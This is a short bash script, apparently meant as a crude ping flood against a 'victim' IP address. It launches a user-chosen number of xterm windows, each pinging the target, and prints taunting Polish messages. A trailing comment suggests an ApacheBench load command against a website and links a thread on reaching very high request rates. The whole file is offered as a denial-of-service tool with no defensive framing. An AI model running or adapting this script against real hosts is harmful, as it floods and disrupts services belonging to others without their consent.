#!/bin/bash
if [[ ( $1 == "" ) || ( $2 == "" ) ]]; then
        echo "Pukam do : $0 IP_Addess_of_Victim Num_OfAttack_Session"
        exit
else
        for (( i=1; i<=$2; i++ )); do
              xterm -e ping $1 &
        done
fi
echo "Pukano do [$1] with$2 :)"

# ab -n 1000 -c 10 https://v.pl
# https://serverfault.com/questions/408546/how-to-achieve-500k-requests-per-second-on-my-webserver/408649
